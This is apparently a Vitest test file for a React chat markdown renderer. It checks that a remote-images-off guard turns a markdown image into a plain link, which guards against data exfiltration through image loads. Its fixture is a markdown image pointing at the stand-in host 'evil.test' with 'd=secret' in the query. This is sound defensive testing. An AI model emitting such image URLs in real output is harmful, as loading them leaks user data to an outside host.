import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it, vi } from "vitest";

vi.mock("./preview/PreviewPaneContext", () => ({
  usePreviewPane: () => ({ openUrl: () => undefined }),
}));

const TEXT = "![chart](https://evil.test/a.png?d=secret)";

describe("remote images in a chat holding text from outside", () => {
  it("stay a link: opening the chat loads nothing", async () => {
    const { default: ChatMarkdown, RemoteImagesOffContext } = await import("./ChatMarkdown");
    const plain = renderToStaticMarkup(<ChatMarkdown text={TEXT} cwd="/repo" />);
    expect(plain).toContain("<img");
    const guarded = renderToStaticMarkup(
      <RemoteImagesOffContext.Provider value={true}>
        <ChatMarkdown text={TEXT} cwd="/repo" />
      </RemoteImagesOffContext.Provider>,
    );
    expect(guarded).not.toContain("<img");
    expect(guarded).toContain('href="https://evil.test/a.png?d=secret"');
    expect(guarded).toContain("chart");
  });
});
